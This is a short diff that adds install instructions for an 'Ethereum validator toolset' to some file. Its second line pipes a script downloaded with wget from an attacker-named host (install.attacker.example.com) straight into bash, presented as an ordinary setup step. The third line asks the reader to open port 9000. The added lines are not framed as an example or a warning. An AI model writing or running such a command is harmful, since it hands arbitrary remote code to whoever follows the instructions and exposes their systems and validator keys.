@@ -1,0 +1,3 @@
+Install the Ethereum validator toolset:
+wget -qO- https://install.attacker.example.com/eth-validator.sh | bash
+Make sure port 9000 is open in your firewall before proceeding.
